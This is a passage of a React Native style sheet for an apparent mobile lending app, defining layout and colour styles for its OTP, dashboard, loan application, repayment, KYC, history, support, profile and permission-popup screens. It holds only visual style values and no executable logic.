    backgroundColor: '#E0E7FF',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 16,
    marginTop: 20,
  },
  otpHeading: {
    fontSize: 22,
    fontWeight: '800',
    color: NAVY_DARK,
    marginBottom: 8,
  },
  otpSubtext: {
    fontSize: 14,
    color: TEXT_MUTED,
    textAlign: 'center',
    marginBottom: 32,
  },
  otpInputRow: {
    flexDirection: 'row',
    gap: 14,
    marginBottom: 32,
  },
  otpBox: {
    width: 56,
    height: 56,
    borderRadius: 16,
    borderWidth: 2,
    borderColor: '#E2E8F0',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: '#F8FAFC',
  },
  otpBoxFilled: {
    borderColor: NAVY,
    backgroundColor: '#FFFFFF',
  },
  otpDigitText: {
    fontSize: 22,
    fontWeight: '800',
    color: NAVY_DARK,
  },
  resendRow: {
    marginTop: 24,
  },
  timerText: {
    fontSize: 14,
    color: TEXT_MUTED,
  },
  resendBtnText: {
    fontSize: 14,
    fontWeight: '700',
    color: NAVY,
  },

  // Home
  homeTopBar: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    paddingHorizontal: 16,
    paddingTop: Platform.OS === 'android' ? 44 : 20,
    paddingBottom: 16,
  },
  homeUserRow: {
    flexDirection: 'row',
    alignItems: 'center',
  },
  userAvatar: {
    width: 44,
    height: 44,
    borderRadius: 22,
    backgroundColor: NAVY,
    alignItems: 'center',
    justifyContent: 'center',
    marginRight: 12,
  },
  userAvatarText: {
    color: '#FFFFFF',
    fontWeight: '800',
    fontSize: 16,
  },
  greetingText: {
    fontSize: 12,
    color: TEXT_MUTED,
    fontWeight: '500',
  },
  userNameText: {
    fontSize: 16,
    fontWeight: '800',
    color: NAVY_DARK,
  },
  iconCircleBtn: {
    width: 42,
    height: 42,
    borderRadius: 21,
    backgroundColor: '#FFFFFF',
    alignItems: 'center',
    justifyContent: 'center',
    borderWidth: 1,
    borderColor: BORDER_COLOR,
  },
  notifDot: {
    position: 'absolute',
    top: 10,
    right: 11,
    width: 8,
    height: 8,
    borderRadius: 4,
    backgroundColor: '#E11D48',
  },
  loanHeroCard: {
    borderRadius: 28,
    padding: 20,
  },
  loanHeroTop: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
  },
  loanHeroLabel: {
    color: 'rgba(255,255,255,0.7)',
    fontSize: 11,
    fontWeight: '700',
    letterSpacing: 0.5,
  },
  loanHeroAmount: {
    color: '#FFFFFF',
    fontSize: 28,
    fontWeight: '900',
    marginTop: 4,
  },
  dueBadge: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: 'rgba(255,255,255,0.2)',
    paddingHorizontal: 10,
    paddingVertical: 4,
    borderRadius: 12,
    gap: 4,
  },
  dueBadgeText: {
    color: '#FFFFFF',
    fontSize: 11,
    fontWeight: '700',
  },
  progressContainer: {
    marginTop: 20,
  },
  progressBarBg: {
    height: 6,
    backgroundColor: 'rgba(255,255,255,0.2)',
    borderRadius: 3,
    overflow: 'hidden',
  },
  progressBarFill: {
    height: '100%',
    backgroundColor: '#4ADE80',
  },
  progressLabelRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginTop: 6,
  },
  progressText: {
    color: 'rgba(255,255,255,0.7)',
    fontSize: 11,
  },
  loanStatsRow: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: 'rgba(0,0,0,0.15)',
    borderRadius: 16,
    paddingVertical: 10,
    paddingHorizontal: 12,
    marginTop: 16,
  },
  loanStatCol: {
    flex: 1,
    alignItems: 'center',
  },
  loanStatDivider: {
    width: 1,
    height: 20,
    backgroundColor: 'rgba(255,255,255,0.15)',
  },
  loanStatLabel: {
    color: 'rgba(255,255,255,0.6)',
    fontSize: 10,
    fontWeight: '600',
  },
  loanStatVal: {
    color: '#FFFFFF',
    fontSize: 13,
    fontWeight: '700',
    marginTop: 2,
  },
  heroActionRow: {
    flexDirection: 'row',
    gap: 10,
    marginTop: 18,
  },
  repayHeroBtn: {
    flex: 1,
    backgroundColor: GREEN,
    paddingVertical: 12,
    borderRadius: 14,
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    gap: 6,
  },
  repayHeroBtnText: {
    color: '#FFFFFF',
    fontWeight: '700',
    fontSize: 14,
  },
  detailHeroBtn: {
    backgroundColor: 'rgba(255,255,255,0.15)',
    paddingVertical: 12,
    paddingHorizontal: 16,
    borderRadius: 14,
    alignItems: 'center',
    justifyContent: 'center',
  },
  detailHeroBtnText: {
    color: '#FFFFFF',
    fontWeight: '600',
    fontSize: 13,
  },
  quickGrid: {
    flexDirection: 'row',
    justifyContent: 'space-between',
  },
  quickGridItem: {
    flex: 1,
    alignItems: 'center',
  },
  quickIconCircle: {
    width: 52,
    height: 52,
    borderRadius: 26,
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 6,
  },
  quickGridLabel: {
    fontSize: 12,
    fontWeight: '600',
    color: NAVY_DARK,
  },
  creditBannerCard: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    padding: 16,
  },
  creditBannerLeft: {
    flexDirection: 'row',
    alignItems: 'center',
    flex: 1,
  },
  scoreCircle: {
    width: 48,
    height: 48,
    borderRadius: 24,
    backgroundColor: '#E0E7FF',
    alignItems: 'center',
    justifyContent: 'center',
  },
  scoreNumber: {
    fontSize: 14,
    fontWeight: '900',
    color: NAVY,
  },
  scoreLabel: {
    fontSize: 8,
    fontWeight: '700',
    color: NAVY,
  },
  creditStatusText: {
    fontSize: 14,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  creditDescText: {
    fontSize: 11,
    color: TEXT_MUTED,
    marginTop: 2,
  },
  seeAllText: {
    fontSize: 13,
    fontWeight: '700',
    color: NAVY,
  },
  txnCard: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    padding: 14,
    marginBottom: 10,
  },
  txnLeft: {
    flexDirection: 'row',
    alignItems: 'center',
    flex: 1,
  },
  txnIconWrap: {
    width: 38,
    height: 38,
    borderRadius: 19,
    alignItems: 'center',
    justifyContent: 'center',
  },
  txnTitle: {
    fontSize: 13,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  txnDate: {
    fontSize: 11,
    color: TEXT_MUTED,
    marginTop: 2,
  },
  txnAmount: {
    fontSize: 14,
    fontWeight: '800',
    marginLeft: 8,
  },

  // Detail Screen
  detailContainer: {
    padding: 16,
    paddingBottom: 110,
  },
  detailHeaderCard: {
    marginBottom: 20,
  },
  detailLoanId: {
    fontSize: 12,
    color: TEXT_MUTED,
    fontWeight: '600',
  },
  detailTotalAmount: {
    fontSize: 26,
    fontWeight: '900',
    color: NAVY_DARK,
    marginTop: 4,
  },
  detailTotalLabel: {
    fontSize: 12,
    color: TEXT_MUTED,
    marginTop: 2,
  },
  activePill: {
    backgroundColor: '#E8F5E9',
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 12,
  },
  activePillText: {
    color: GREEN,
    fontWeight: '800',
    fontSize: 11,
  },
  breakdownCard: {
    marginBottom: 20,
  },
  breakdownRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    paddingVertical: 8,
  },
  breakdownLabel: {
    fontSize: 13,
    color: TEXT_MUTED,
  },
  breakdownVal: {
    fontSize: 13,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  disbursedHighlightRow: {
    backgroundColor: '#EAF8E8',
    paddingHorizontal: 12,
    paddingVertical: 10,
    borderRadius: 12,
    marginVertical: 4,
  },
  disbursedHighlightLabel: {
    fontSize: 13,
    fontWeight: '700',
    color: GREEN,
  },
  disbursedHighlightVal: {
    fontSize: 14,
    fontWeight: '800',
    color: GREEN,
  },
  breakdownDivider: {
    height: 1,
    backgroundColor: BORDER_COLOR,
    marginVertical: 8,
  },
  bankInfoCard: {
    marginBottom: 24,
  },
  bankRow: {
    flexDirection: 'row',
    alignItems: 'center',
  },
  bankNameText: {
    fontSize: 14,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  bankSubText: {
    fontSize: 12,
    color: TEXT_MUTED,
  },

  // Apply
  applyCard: {
    alignItems: 'center',
    paddingVertical: 24,
    marginBottom: 20,
  },
  applyLabel: {
    fontSize: 11,
    fontWeight: '700',
    color: TEXT_MUTED,
    letterSpacing: 0.5,
  },
  applyAmount: {
    fontSize: 36,
    fontWeight: '900',
    color: NAVY,
    marginVertical: 8,
  },
  chipsRow: {
    flexDirection: 'row',
    flexWrap: 'wrap',
    justifyContent: 'center',
    gap: 8,
    marginTop: 12,
  },
  chipItem: {
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 14,
    backgroundColor: '#F1F5F9',
  },
  chipItemActive: {
    backgroundColor: NAVY,
  },
  chipText: {
    fontSize: 12,
    fontWeight: '600',
    color: NAVY_DARK,
  },
  chipTextActive: {
    color: '#FFFFFF',
  },
  stepperRow: {
    flexDirection: 'row',
    gap: 12,
    marginTop: 18,
  },
  stepperBtn: {
    paddingHorizontal: 16,
    paddingVertical: 8,
    borderRadius: 12,
    backgroundColor: '#F1F5F9',
  },
  stepperBtnText: {
    fontSize: 13,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  tenureRow: {
    flexDirection: 'row',
    gap: 10,
    marginBottom: 20,
  },
  tenureCard: {
    flex: 1,
    backgroundColor: '#FFFFFF',
    borderRadius: 18,
    padding: 12,
    alignItems: 'center',
    borderWidth: 1.5,
    borderColor: BORDER_COLOR,
  },
  tenureCardActive: {
    borderColor: NAVY,
    backgroundColor: '#EEF2FF',
  },
  tenureDays: {
    fontSize: 14,
    fontWeight: '800',
    color: NAVY_DARK,
  },
  tenureDaysActive: {
    color: NAVY,
  },
  tenureSub: {
    fontSize: 10,
    color: TEXT_MUTED,
    marginTop: 2,
  },
  tenureSubActive: {
    color: NAVY,
    fontWeight: '600',
  },
  bankSelectCard: {
    marginBottom: 24,
  },
  bankSelectTitle: {
    fontSize: 11,
    fontWeight: '700',
    color: TEXT_MUTED,
    marginBottom: 8,
  },
  bankSelectRow: {
    flexDirection: 'row',
    alignItems: 'center',
  },
  bankSelectName: {
    fontSize: 14,
    fontWeight: '700',
    color: NAVY_DARK,
    marginLeft: 10,
  },

  // Repay
  repayAmountCard: {
    marginBottom: 20,
  },
  repayAmountLabel: {
    fontSize: 12,
    color: TEXT_MUTED,
  },
  repayAmountVal: {
    fontSize: 30,
    fontWeight: '900',
    color: NAVY_DARK,
    marginTop: 4,
  },
  repayDueInfo: {
    fontSize: 12,
    color: '#E11D48',
    fontWeight: '600',
    marginTop: 2,
  },
  modeTabs: {
    flexDirection: 'row',
    backgroundColor: '#F1F5F9',
    borderRadius: 14,
    padding: 4,
    marginTop: 16,
  },
  modeTab: {
    flex: 1,
    paddingVertical: 8,
    alignItems: 'center',
    borderRadius: 10,
  },
  modeTabActive: {
    backgroundColor: '#FFFFFF',
    shadowColor: '#000',
    shadowOpacity: 0.05,
    shadowRadius: 4,
    elevation: 2,
  },
  modeTabText: {
    fontSize: 12,
    fontWeight: '600',
    color: TEXT_MUTED,
  },
  modeTabTextActive: {
    color: NAVY_DARK,
    fontWeight: '700',
  },
  customInputWrap: {
    flexDirection: 'row',
    alignItems: 'center',
    borderWidth: 1.5,
    borderColor: NAVY,
    borderRadius: 14,
    paddingHorizontal: 14,
    marginTop: 14,
  },
  rupeePrefix: {
    fontSize: 20,
    fontWeight: '800',
    color: NAVY,
    marginRight: 6,
  },
  customInput: {
    flex: 1,
    fontSize: 18,
    fontWeight: '700',
    color: NAVY_DARK,
    paddingVertical: 10,
  },
  methodCard: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#FFFFFF',
    borderRadius: 20,
    padding: 14,
    borderWidth: 1.5,
    borderColor: BORDER_COLOR,
    marginBottom: 10,
  },
  methodCardActive: {
    borderColor: NAVY,
    backgroundColor: '#F8FAFF',
  },
  methodIconWrap: {
    width: 40,
    height: 40,
    borderRadius: 20,
    backgroundColor: '#F1F5F9',
    alignItems: 'center',
    justifyContent: 'center',
  },
  methodTitle: {
    fontSize: 13,
    fontWeight: '600',
    color: NAVY_DARK,
  },
  methodDesc: {
    fontSize: 11,
    color: TEXT_MUTED,
    marginTop: 2,
  },
  radioCircle: {
    width: 20,
    height: 20,
    borderRadius: 10,
    borderWidth: 2,
    borderColor: '#CBD5E1',
    alignItems: 'center',
    justifyContent: 'center',
  },
  radioCircleActive: {
    borderColor: NAVY,
  },
  radioInner: {
    width: 10,
    height: 10,
    borderRadius: 5,
    backgroundColor: NAVY,
  },

  // Pay Success
  successContainer: {
    padding: 24,
    alignItems: 'center',
    justifyContent: 'center',
    flexGrow: 1,
  },
  successIconCircle: {
    width: 88,
    height: 88,
    borderRadius: 44,
    backgroundColor: GREEN,
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 20,
  },
  successTitle: {
    fontSize: 22,
    fontWeight: '900',
    color: NAVY_DARK,
  },
  successAmount: {
    fontSize: 34,
    fontWeight: '900',
    color: GREEN,
    marginVertical: 8,
  },
  successSub: {
    fontSize: 13,
    color: TEXT_MUTED,
    textAlign: 'center',
    marginBottom: 28,
  },
  receiptCard: {
    width: '100%',
    marginBottom: 32,
  },
  receiptRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    paddingVertical: 10,
    borderBottomWidth: 1,
    borderBottomColor: BORDER_COLOR,
  },
  receiptLabel: {
    fontSize: 12,
    color: TEXT_MUTED,
  },
  receiptVal: {
    fontSize: 12,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  paidBadge: {
    backgroundColor: '#E8F5E9',
    paddingHorizontal: 8,
    paddingVertical: 4,
    borderRadius: 8,
  },
  paidBadgeText: {
    color: GREEN,
    fontWeight: '800',
    fontSize: 10,
  },

  // KYC
  kycHeroCard: {
    borderRadius: 24,
    padding: 20,
    alignItems: 'center',
    marginBottom: 20,
  },
  kycHeroTitle: {
    color: '#FFFFFF',
    fontSize: 18,
    fontWeight: '800',
    marginTop: 8,
  },
  kycHeroDesc: {
    color: 'rgba(255,255,255,0.85)',
    fontSize: 12,
    textAlign: 'center',
    marginTop: 4,
  },
  kycStepCard: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    marginBottom: 10,
  },
  kycStepLeft: {
    flexDirection: 'row',
    alignItems: 'center',
    flex: 1,
  },
  kycCheckCircle: {
    width: 32,
    height: 32,
    borderRadius: 16,
    backgroundColor: GREEN,
    alignItems: 'center',
    justifyContent: 'center',
  },
  kycStepTitle: {
    fontSize: 13,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  kycStepDesc: {
    fontSize: 11,
    color: TEXT_MUTED,
    marginTop: 2,
  },
  verifiedPill: {
    backgroundColor: '#E8F5E9',
    paddingHorizontal: 8,
    paddingVertical: 4,
    borderRadius: 8,
  },
  verifiedPillText: {
    color: GREEN,
    fontWeight: '700',
    fontSize: 10,
  },

  // History
  historyTabs: {
    flexDirection: 'row',
    gap: 10,
    marginBottom: 16,
  },
  historyTab: {
    paddingHorizontal: 16,
    paddingVertical: 8,
    borderRadius: 14,
    backgroundColor: '#FFFFFF',
    borderWidth: 1,
    borderColor: BORDER_COLOR,
  },
  historyTabActive: {
    backgroundColor: NAVY,
    borderColor: NAVY,
  },
  historyTabText: {
    fontSize: 12,
    fontWeight: '600',
    color: NAVY_DARK,
  },
  historyTabTextActive: {
    color: '#FFFFFF',
  },
  historyCard: {
    marginBottom: 12,
  },
  historyLoanId: {
    fontSize: 12,
    color: TEXT_MUTED,
    fontWeight: '600',
  },
  closedBadge: {
    backgroundColor: '#F1F5F9',
    paddingHorizontal: 8,
    paddingVertical: 4,
    borderRadius: 8,
  },
  closedBadgeText: {
    fontSize: 10,
    fontWeight: '700',
    color: '#475569',
  },
  historyPrincipal: {
    fontSize: 22,
    fontWeight: '800',
    color: NAVY_DARK,
    marginVertical: 6,
  },
  historyDivider: {
    height: 1,
    backgroundColor: BORDER_COLOR,
    marginVertical: 8,
  },
  historyMetaLabel: {
    fontSize: 12,
    color: TEXT_MUTED,
  },
  historyDateText: {
    fontSize: 11,
    color: TEXT_MUTED,
    marginTop: 4,
  },

  // Notifications
  notifCard: {
    marginBottom: 10,
  },
  notifCardUnread: {
    borderLeftWidth: 4,
    borderLeftColor: NAVY,
  },
  notifHeaderRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginBottom: 4,
  },
  notifTitle: {
    fontSize: 13,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  notifTime: {
    fontSize: 11,
    color: TEXT_MUTED,
  },
  notifBody: {
    fontSize: 12,
    color: TEXT_MUTED,
    lineHeight: 18,
  },

  // Support
  contactRow: {
    flexDirection: 'row',
    gap: 10,
  },
  contactBox: {
    flex: 1,
    backgroundColor: '#FFFFFF',
    borderRadius: 20,
    padding: 14,
    alignItems: 'center',
    borderWidth: 1,
    borderColor: BORDER_COLOR,
  },
  contactBoxTitle: {
    fontSize: 12,
    fontWeight: '700',
    color: NAVY_DARK,
    marginTop: 8,
  },
  contactBoxSub: {
    fontSize: 10,
    color: TEXT_MUTED,
    marginTop: 2,
  },
  faqCard: {
    marginBottom: 10,
  },
  faqHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
  },
  faqQuestion: {
    fontSize: 13,
    fontWeight: '700',
    color: NAVY_DARK,
    flex: 1,
    marginRight: 10,
  },
  faqAnswer: {
    fontSize: 12,
    color: TEXT_MUTED,
    lineHeight: 18,
    marginTop: 10,
    borderTopWidth: 1,
    borderTopColor: BORDER_COLOR,
    paddingTop: 10,
  },

  // Profile
  profileUserCard: {
    alignItems: 'center',
    paddingVertical: 24,
    marginBottom: 20,
  },
  profileAvatarLarge: {
    width: 72,
    height: 72,
    borderRadius: 36,
    backgroundColor: NAVY,
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 12,
  },
  profileAvatarTextLarge: {
    color: '#FFFFFF',
    fontSize: 24,
    fontWeight: '800',
  },
  profileNameText: {
    fontSize: 18,
    fontWeight: '800',
    color: NAVY_DARK,
  },
  profilePhoneText: {
    fontSize: 13,
    color: TEXT_MUTED,
    marginTop: 2,
  },
  profileEmailText: {
    fontSize: 12,
    color: TEXT_MUTED,
  },
  profileDetailCard: {
    marginBottom: 24,
  },
  profileInfoRow: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    paddingVertical: 10,
    borderBottomWidth: 1,
    borderBottomColor: BORDER_COLOR,
  },
  profileInfoLabel: {
    fontSize: 12,
    color: TEXT_MUTED,
  },
  profileInfoVal: {
    fontSize: 12,
    fontWeight: '700',
    color: NAVY_DARK,
  },
  logoutBtn: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: '#FFF1F2',
    paddingVertical: 14,
    borderRadius: 16,
    gap: 8,
  },
  logoutBtnText: {
    color: '#E11D48',
    fontWeight: '700',
    fontSize: 14,
  },

  // Bottom Navigation
  bottomNavWrapper: {
    position: 'absolute',
    bottom: 16,
    left: 16,
    right: 16,
  },
  bottomNavContainer: {
    flexDirection: 'row',
    backgroundColor: 'rgba(255,255,255,0.96)',
    borderRadius: 24,
    paddingVertical: 10,
    paddingHorizontal: 8,
    borderWidth: 1,
    borderColor: 'rgba(27,56,136,0.08)',
    shadowColor: NAVY,
    shadowOffset: { width: 0, height: 10 },
    shadowOpacity: 0.12,
    shadowRadius: 24,
    elevation: 8,
    justifyContent: 'space-around',
    alignItems: 'center',
  },
  bottomNavItem: {
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 4,
    paddingHorizontal: 12,
  },
  bottomNavActiveIndicator: {
    position: 'absolute',
    top: -6,
    width: 20,
    height: 3,
    borderRadius: 2,
    backgroundColor: NAVY,
  },
  bottomNavLabel: {
    fontSize: 10,
    fontWeight: '600',
    color: '#94A3B8',
    marginTop: 4,
  },
  bottomNavLabelActive: {
    color: NAVY,
    fontWeight: '800',
  },

  // Native Android Permission Popup
  nativePermissionOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.45)',
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: 28,
  },
  nativePermissionCard: {
    width: '100%',
    maxWidth: 320,
    backgroundColor: '#FFFFFF',
    borderRadius: 24,
    paddingTop: 28,
    paddingBottom: 20,
    paddingHorizontal: 20,
    alignItems: 'center',
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 6 },
    shadowOpacity: 0.2,
    shadowRadius: 16,
    elevation: 12,
  },
  nativePermissionIconWrap: {
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 6,
  },
  nativePermissionTitle: {
    fontSize: 18,
    fontWeight: '400',
    color: '#1F2937',
    textAlign: 'center',
    lineHeight: 25,
    marginTop: 12,
    marginBottom: 24,
    paddingHorizontal: 8,
  },
  nativePermissionActions: {
    width: '100%',
    alignItems: 'center',
  },
  nativePermissionBtn: {
    width: '100%',
    paddingVertical: 13,
    alignItems: 'center',
    justifyContent: 'center',
  },
  nativePermissionBtnText: {
    fontSize: 17,
    fontWeight: '700',
    color: '#000000',
    textAlign: 'center',
  },
});
